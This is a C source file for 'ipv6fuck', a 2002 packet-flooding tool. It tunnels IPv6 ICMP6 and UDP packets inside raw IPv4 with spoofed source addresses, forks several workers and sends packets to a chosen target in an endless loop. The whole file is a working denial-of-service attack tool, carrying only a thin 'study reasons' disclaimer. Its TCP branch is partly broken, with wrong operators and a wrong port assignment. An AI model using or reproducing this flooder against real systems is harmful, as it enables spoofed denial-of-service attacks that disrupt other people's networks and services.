/*
    ipv6fuck v1.0alfa - (c)2002 schizoid
    (deriving from icmp6fuck v3)

    this program wrote to study reasons
    
    compilating istruction:

      linux -> gcc -s -O2 -static -DLINUX ipv6fuck.c -o ipv6fuck
       *bsd -> gcc -s -O2 -static ipv6fuck.c -o ipv6fuck
    solaris -> gcc -s -O2 -static -DSOLARIS ipv6fuck.c -o ipv6fuck (?!?! problem :P)

    the author doesn't assume responsability on eventual damages caused
    from the improper use of the program.

    ipv6? no thanks I'm allergic to the ping timeout ;>
*/
#include <stdio.h>
#include <stdlib.h>

#include <netdb.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <unistd.h>
#include <netinet/in_systm.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/ip6.h>
#include <netinet/icmp6.h>
#ifdef LINUX
#define    __FAVOR_BSD
#endif
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <string.h>
#include <signal.h>

#define    RAW  0
#define    ICMP6  1
#define    TCP  2
#define    UDP  3

#define    IPV6_RAW_HEADERS_LENGTH    sizeof(struct ip) + sizeof(struct ip6_hdr)
#define    IPV6_ICMP6_HEADERS_LENGTH  sizeof(struct ip) + sizeof(struct ip6_hdr) + sizeof(struct icmp6_hdr)
#define    IPV6_TCP_HEADERS_LENGTH    sizeof(struct ip) + sizeof(struct ip6_hdr) + sizeof(struct tcphdr)
#define    IPV6_UDP_HEADERS_LENGTH    sizeof(struct ip) + sizeof(struct ip6_hdr) + sizeof(struct udphdr)

#define    getrandom(min, max) ((rand() % (int)(((max)+1) - (min))) + (min))

int    pid, cpid=0, master=1;

unsigned short in_cksum(unsigned short *ptr, int nbytes)
{
  register long  sum;
  u_short    oddbyte;
  register  u_short answer;

  sum = 0;
  while (nbytes > 1) {
    sum += *ptr++;
    nbytes -= 2;
  }

  if (nbytes == 1) {
    oddbyte = 0;
    *((u_char *) & oddbyte) = *(u_char *) ptr;
    sum += oddbyte;
  }

  sum = (sum >> 16) + (sum & 0xffff);
  sum += (sum >> 16);
  answer = ~sum;
  return (answer);
}

u_short pseudo_check(struct in6_addr from, struct in6_addr to, void *pkt, int length, int nh)
{
  struct pseudo6 {
    struct in6_addr src;
    struct in6_addr dst;

    unsigned short plen;
    u_char zero;
    u_char nh;
  } *psd;

  char *tosum;
  u_short resultz;

  tosum = (char *)(malloc(length + sizeof(struct pseudo6)));
  memset(tosum, 0, length + sizeof(struct pseudo6));
  psd = (struct pseudo6 *)(tosum);
  memcpy(tosum + sizeof(struct pseudo6), pkt, length);
  psd->src = from;
  psd->dst = to;
  psd->plen = htons(length);
  psd->nh = nh;
  resultz = in_cksum((u_short *)tosum, length + sizeof(struct pseudo6));
  free(tosum);
  return(resultz);
}

void proc_SIGINT()
{
  if (master) printf("...done!\n\n");
  exit(0);
}

void proc_SIGTERM()
{
  if (master) printf("...done!\n\n");
  if (cpid) kill(cpid, SIGTERM);

  exit(0);
}

int usage(char *name)
{
  printf( "%s <ipv4_src> <ipv4_dst> <ipv6_src> <ipv6_dst> <raw>|<icmp6>|<tcp>|<udp> [ options... ]\n\n"
    "  options: [ -b <bytes> ] [ -u <usleep> ] [ -k <forks> ]\n"
    "           [ -m <multiply> ] [ -S <seconds> ]\n"
    "    tcp -> [ -s <src_port> ] [ -d <dst_port> ]\n"
    "           [ -f <flags> ]  flags: (u)rg (a)ck (p)sh (r)st (s)yn (f)in\n"
    "    udp -> [ -s <src_port> ] [ -d <dst_port> ]\n"
    "  icmp6 -> [ -t <type> ] [ -c <code> ]\n\n"
    "  default options values: -b 8 -u 100 -k 1\n"
    "                          -m 1 -S 5 (0=infinite)\n"
    "                          -s 0 (0=random) -d 0 (0=random) -f s\n"
    "                          -t 0x80 -c 0x00\n\n"
    "for help send e-mail to schizoid@arabia.com\n\n\n", name);
  exit(-1);
}

int main(int argc, char **argv)
{
  u_char ipv6_packet[64*1024];
  struct ip *ip4 = (struct ip *) ipv6_packet;
  struct ip6_hdr *ip6 = (struct ip6_hdr *) (ipv6_packet + sizeof(struct ip));
  struct icmp6_hdr *icmp6 = (struct icmp6_hdr *) (ipv6_packet + sizeof(struct ip) + sizeof(struct ip6_hdr));
  struct udphdr *udp6 = (struct udphdr *) (ipv6_packet + sizeof(struct ip) + sizeof(struct ip6_hdr));
  struct tcphdr *tcp6 = (struct tcphdr *) (ipv6_packet + sizeof(struct ip) + sizeof(struct ip6_hdr));
  int      opt, opt_proto;
  int      opt_bytes, opt_usleep, opt_forks, old_opt_forks;
  int      opt_multiply, opt_seconds;
  int      opt_src_port, opt_dst_port;
  int      opt_tcp_urg, opt_tcp_ack, opt_tcp_psh, opt_tcp_rst, opt_tcp_syn, opt_tcp_fin;
  int      opt_icmp6_type, opt_icmp6_code;
  char      *proc_name;
  char      arg_name[1024];
  char      str_ipv4_src[INET_ADDRSTRLEN];
  char      str_ipv4_dst[INET_ADDRSTRLEN];
  char      str_ipv6_src[INET6_ADDRSTRLEN];
  char      str_ipv6_dst[INET6_ADDRSTRLEN];
  struct  hostent    *he;
  struct  sockaddr_in  pecora;
  int      ipv6_length, multiply, s, on=1;

  srandom(time(NULL) + random());

  printf( "\n--------------------------------------"
    "\n ipv6fuck v1.0alfa - (c)2002 schizoid"
    "\n--------------------------------------\n\n");

  opt_bytes = 8;
  opt_usleep = 100;
  opt_forks = 1;
  opt_multiply = 1;
  opt_seconds = 5;
  opt_src_port = 0;
  opt_dst_port = 0;
  opt_tcp_urg = 0;
  opt_tcp_ack = 0;
  opt_tcp_psh = 0;
  opt_tcp_rst = 0;
  opt_tcp_syn = 1;
  opt_tcp_fin = 0;
  opt_icmp6_type = 0x80;
  opt_icmp6_code = 0x00;
  bzero(&ipv6_packet, sizeof(ipv6_packet));

  memset(&ipv6_packet, 0x12, sizeof(ipv6_packet));
  memset(&ipv6_packet, 0, 68);

  for (proc_name = argv[0]; strstr(proc_name, "/");  proc_name = strstr(argv[0], "/")+1);

  if (argc < 6) usage(argv[0]);
  optind = 6;
      while ((opt = getopt(argc, argv, "b:u:k:m:S:s:d:f:t:c:")) != -1) {
      switch (opt) {
    case 'b':
        opt_bytes = strtoul(optarg, NULL, 10);
        break;
    case 'u':
        if ((opt_usleep = strtoul(optarg, NULL, 10)) < 0) {
      fprintf(stderr, "%s: invalid usleep time -- %i\n\n", proc_name, optarg);
      usage(argv[0]);
        }
        break;
    case 'k':
        if ((opt_forks = strtoul(optarg, NULL, 10)) < 0) {
      fprintf(stderr, "%s: invalid number of forks -- %i\n\n", proc_name, optarg);
      usage(argv[0]);
        }
        break;
    case 'm':
        if ((opt_multiply = strtoul(optarg, NULL, 10)) < 1) {
      fprintf(stderr, "%s: invalid multiply factor -- %i\n\n", proc_name, optarg);
      usage(argv[0]);
        }
        break;
    case 'S':
        if ((opt_seconds = strtoul(optarg, NULL, 10)) < 0) {
      fprintf(stderr, "%s: invalid number of seconds -- %i\n\n", proc_name, optarg);
      usage(argv[0]);
        }
        break;
    case 's':
        opt_src_port = strtoul(optarg, NULL, 10);
        if ((opt_src_port < 0) || (opt_src_port > 65535)) {
      fprintf(stderr, "%s: invalid source port -- %i\n\n", proc_name, optarg);
      usage(argv[0]);
        }
        break;
    case 'd':
        opt_dst_port = strtoul(optarg, NULL, 10);
        if ((opt_dst_port < 0) || (opt_dst_port > 65535)) {
      fprintf(stderr, "%s: invalid destination port -- %i\n\n", proc_name, optarg);
      usage(argv[0]);
        }
        break;
    case 'f':
        opt_tcp_syn = 0;
        if (strchr(optarg, 'u')) opt_tcp_urg = 1;
        if (strchr(optarg, 'a')) opt_tcp_ack = 1;
        if (strchr(optarg, 'p')) opt_tcp_psh = 1;
        if (strchr(optarg, 'r')) opt_tcp_rst = 1;
        if (strchr(optarg, 's')) opt_tcp_syn = 1;
        if (strchr(optarg, 'f')) opt_tcp_fin = 1;
        break;
    case 't':
        opt_icmp6_type = strtoul(optarg, NULL, 16);
        if ((opt_icmp6_type < 0) || (opt_icmp6_type > 255)) {
      fprintf(stderr, "%s: invalid icmp6 type -- %i\n\n", proc_name, optarg);
      usage(argv[0]);
        }
        break;
    case 'c':
        opt_icmp6_code = strtoul(optarg, NULL, 16);
        if ((opt_icmp6_code < 0) || (opt_icmp6_code > 255)) {
      fprintf(stderr, "%s: invalid icmp6 code -- %i\n\n", proc_name, optarg);
      usage(argv[0]);
        }
        break;
    default:
        fprintf(stderr, "\n");
        usage(argv[0]);
        break;
      }
  }

  if (!(he = gethostbyname(argv[1]))) {
      fprintf(stderr, "%s: invalid source ipv4 -- %s\n\n", proc_name, argv[1]);
      usage(argv[0]);
  } else memcpy(&ip4->ip_src.s_addr, he->h_addr, he->h_length);

  if (!(he = gethostbyname(argv[2]))) {
      fprintf(stderr, "%s: invalid destination ipv4 -- %s\n\n", proc_name, argv[2]);
      usage(argv[0]);
  } else memcpy(&ip4->ip_dst.s_addr, he->h_addr, he->h_length);

  if (!(he = gethostbyname2(argv[3], AF_INET6))) {
      fprintf(stderr, "%s: invalid source ipv6 -- %s\n\n", proc_name, argv[3]);
      usage(argv[0]);
  } else memcpy(&ip6->ip6_src, he->h_addr, he->h_length);

  if (!(he = gethostbyname2(argv[4], AF_INET6))) {
      fprintf(stderr, "%s: invalid destination ipv6 -- %s\n\n", proc_name, argv[4]);
      usage(argv[0]);
  } else memcpy(&ip6->ip6_dst, he->h_addr, he->h_length);


  ip4->ip_v = 4;
  ip4->ip_hl = 5;
  ip4->ip_tos = 0;
//  ip4->ip_len = htons(IPV6_ICMP6_HEADERS_LENGTH + opt_bytes);
//  ip4->ip_id = 0x0;
//  ip4->ip_off = htons(0x4000);
  ip4->ip_off = 0;
  ip4->ip_ttl = 0x40;
  ip4->ip_p = IPPROTO_IPV6;
//  ip4->ip_sum = in_cksum((u_short *) ip4, sizeof (struct ip));

  ip6->ip6_vfc = 0x60;
//  ip6->ip6_flow = 0;
//  ip6->ip6_plen = htons(sizeof(struct icmp6_hdr) + opt_bytes);
//  ip6->ip6_nxt = IPPROTO_ICMPV6;
  ip6->ip6_hlim = 0x40;

  if (strstr("raw\0", argv[5])) {
    opt_proto=RAW;
  } else
  if (strstr("icmp6\0", argv[5])) {
    opt_proto=ICMP6;
    ipv6_length = IPV6_ICMP6_HEADERS_LENGTH + opt_bytes;

    ip6->ip6_plen = htons(sizeof(struct icmp6_hdr) + opt_bytes);
    ip6->ip6_nxt = IPPROTO_ICMPV6;

    icmp6->icmp6_type = opt_icmp6_type;
    icmp6->icmp6_code = opt_icmp6_code; //128?

    ip4->ip_id = htons(rand());
    ip4->ip_sum = in_cksum((u_short *) ip4, sizeof (struct ip));
    icmp6->icmp6_data16[0] = rand();
    icmp6->icmp6_data16[1] = rand();
    icmp6->icmp6_cksum = 0;
    icmp6->icmp6_cksum = pseudo_check(ip6->ip6_src, ip6->ip6_dst, icmp6, sizeof(struct icmp6_hdr) + opt_bytes, IPPROTO_ICMPV6);
  } else
  if (strstr("tcp\0", argv[5])) {
    opt_proto=TCP;
    ipv6_length = IPV6_TCP_HEADERS_LENGTH + opt_bytes;
    ip6->ip6_plen = htons(sizeof(struct icmp6_hdr) + opt_bytes);
    ip6->ip6_nxt = IPPROTO_UDP;

//
//struct tcphdr
//  {
//    u_int16_t th_sport;         /* source port */
//    u_int16_t th_dport;         /* destination port */
//    tcp_seq th_seq;             /* sequence number */
//    tcp_seq th_ack;             /* acknowledgement number */
//#  if __BYTE_ORDER == __LITTLE_ENDIAN
//    u_int8_t th_x2:4;           /* (unused) */
//    u_int8_t th_off:4;          /* data offset */
//#  endif
//#  if __BYTE_ORDER == __BIG_ENDIAN
//    u_int8_t th_off:4;          /* data offset */
//    u_int8_t th_x2:4;           /* (unused) */
//#  endif
//    u_int8_t th_flags;
//    u_int16_t th_win;           /* window */
//    u_int16_t th_sum;           /* checksum */
//    u_int16_t th_urp;           /* urgent pointer */
//};
    if (opt_tcp_urg) tcp6->th_flags=TH_URG; else tcp6->th_flags=0;
    if (opt_tcp_ack) tcp6->th_flags!=TH_ACK; else
    if (opt_tcp_psh) tcp6->th_flags!=TH_PUSH; else
    if (opt_tcp_rst) tcp6->th_flags!=TH_RST; else
    if (opt_tcp_syn) tcp6->th_flags!=TH_SYN; else
    if (opt_tcp_fin) tcp6->th_flags!=TH_FIN;

    printf("%i\n", tcp6->th_flags);

    ip4->ip_id = htons(rand());
    ip4->ip_sum = in_cksum((u_short *) ip4, sizeof (struct ip));
    tcp6->th_sum = 0;
    if (opt_src_port) tcp6->th_sport = htons(opt_src_port); else tcp6->th_sport = htons(getrandom(0, 65535));
    if (opt_dst_port) tcp6->th_sport = htons(opt_dst_port); else tcp6->th_dport = htons(getrandom(0, 65535));
  } else
  if (strstr("udp\0", argv[5])) {
    opt_proto=UDP;
    ipv6_length = IPV6_UDP_HEADERS_LENGTH + opt_bytes;
    ip6->ip6_plen = htons(sizeof(struct icmp6_hdr) + opt_bytes);
    ip6->ip6_nxt = IPPROTO_UDP;
    udp6->uh_ulen = htons(sizeof(struct udphdr) + opt_bytes);

    ip4->ip_id = htons(rand());
    ip4->ip_sum = in_cksum((u_short *) ip4, sizeof (struct ip));
    udp6->uh_sum = 0;
    if (opt_src_port) udp6->uh_sport = htons(opt_src_port); else udp6->uh_sport = htons(getrandom(0, 65535));
    if (opt_dst_port) udp6->uh_sport = htons(opt_dst_port); else udp6->uh_dport = htons(getrandom(0, 65535));
  } else {
    fprintf(stderr, "%s: invalid protocol -- %s\n\n", proc_name, argv[5]);
    usage(argv[0]);
  }

  ip4->ip_len = htons(ipv6_length);


  bzero(&pecora, sizeof(pecora));
  pecora.sin_family = AF_INET;
  pecora.sin_addr.s_addr = ip4->ip_dst.s_addr;

  s = socket (AF_INET, SOCK_RAW, IPPROTO_RAW);
  setsockopt(s, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on));

  signal(SIGINT, proc_SIGINT);
  signal(SIGTERM, proc_SIGTERM);

  old_opt_forks = opt_forks;
  while (opt_forks-- > 0) {
    int  desync = (int) getrandom(0,50000);
    usleep(desync);

    if ((pid = fork()) == -1) {
      fprintf(stderr, "%s: error -- fork()\n\n", proc_name);
      exit(-1);
    } else
    if (pid != 0) {    // processo padre
      cpid = pid;
      break;
    } else {    // processo figlio
      master = 0;
    }
  }
  pid = getpid();

  if (master) {
    inet_ntop(AF_INET, &ip4->ip_src.s_addr, str_ipv4_src, INET_ADDRSTRLEN);
    inet_ntop(AF_INET, &ip4->ip_dst.s_addr, str_ipv4_dst, INET_ADDRSTRLEN);
    inet_ntop(AF_INET6, &ip6->ip6_src, str_ipv6_src, INET6_ADDRSTRLEN);
    inet_ntop(AF_INET6, &ip6->ip6_dst, str_ipv6_dst, INET6_ADDRSTRLEN);
    switch (opt_proto) {
      case RAW:
        printf( "RAW isn't implemented!!!\n");
        break;
      case ICMP6:
        printf( "ICMP6 %s (%s) from %s (%s) %i data bytes\n"
          "  (headers length: ip=%i, ip6=%i, icmp6=%i) - headers+data=%i bytes\n",
          str_ipv6_dst, str_ipv4_dst, str_ipv6_src, str_ipv4_src, opt_bytes,
          sizeof(struct ip), sizeof(struct ip6_hdr), sizeof(struct icmp6_hdr), ipv6_length);
        printf( "  (type=0x%x, code=0x%x)\n", opt_icmp6_type, opt_icmp6_code);
        break;
      case TCP:
        printf( "TCP isn't implemented!!!\n");
        break;
      case UDP:
        printf( "UDP %s (%s) from %s (%s) %i data bytes\n"
          "  (headers length: ip=%i, ip6=%i, udp=%i) - headers+data=%i bytes\n",
          str_ipv6_dst, str_ipv4_dst, str_ipv6_src, str_ipv4_src, opt_bytes,
          sizeof(struct ip), sizeof(struct ip6_hdr), sizeof(struct udphdr), ipv6_length);
        printf( "  (src_port=");
        if (opt_src_port) printf("%i", opt_src_port); else printf("random");
        printf( ", dst_port=");
        if (opt_dst_port) printf("%i)\n", opt_dst_port); else printf("random)\n");
        break;
    }

    printf("\nsending packets (usleep=%i, forks=%i, multiply=%i, seconds=", opt_usleep, old_opt_forks, opt_multiply);
    if (opt_seconds) printf("%i", opt_seconds); else printf("infinite");
    printf(")...\n  (press ctrl+c or 'kill %i' to break)\n\n", pid);
    if (opt_seconds) while (opt_seconds-- > 0) usleep(1000000); else for (;;);
    proc_SIGTERM();
  } else {
    bzero(&pecora, sizeof(pecora));
    pecora.sin_family = AF_INET;
    pecora.sin_addr.s_addr = ip4->ip_dst.s_addr;

    s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (s == -1) {
      fprintf(stderr, "%s: error -- socket()\n\n", proc_name);
      proc_SIGTERM();
    }
    if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) == -1) {
      fprintf(stderr, "%s: error -- setsockopt()\n\n", proc_name);
      proc_SIGTERM();
    };

    for (;;) {
      switch (opt_proto) {
        case RAW:
          break;
        case ICMP6:
          ip4->ip_id = htons(rand());
          ip4->ip_sum = in_cksum((u_short *) ip4, sizeof (struct ip));
          icmp6->icmp6_data16[0] = rand();
          icmp6->icmp6_data16[1] = rand();
          icmp6->icmp6_cksum = 0;
          icmp6->icmp6_cksum = pseudo_check(ip6->ip6_src, ip6->ip6_dst, icmp6, sizeof(struct icmp6_hdr) + opt_bytes, IPPROTO_ICMPV6);
          break;
        case TCP:
          break;
        case UDP:
          ip4->ip_id = htons(rand());
          ip4->ip_sum = in_cksum((u_short *) ip4, sizeof (struct ip));
          if (opt_src_port) udp6->uh_sport = htons(opt_src_port); else udp6->uh_sport = htons(getrandom(0, 65535));
          if (opt_dst_port) udp6->uh_dport = htons(opt_dst_port); else udp6->uh_dport = htons(getrandom(0, 65535));

          udp6->uh_sum = 0;
          udp6->uh_sum = pseudo_check(ip6->ip6_src, ip6->ip6_dst, udp6, sizeof(struct udphdr) + opt_bytes, IPPROTO_UDP);
          break;
      }

      for (multiply = 1; multiply <= opt_multiply; multiply++) {
        if (sendto(s, ipv6_packet, ipv6_length, 0, (struct sockaddr *) &pecora, sizeof(pecora)) == -1) {
        //  fprintf(stderr, "%s: error -- sendto()\n\n", proc_name);
        //  proc_SIGTERM();
        }
      }

      if (opt_usleep) usleep(opt_usleep);
    }
  }
  close(s);
}
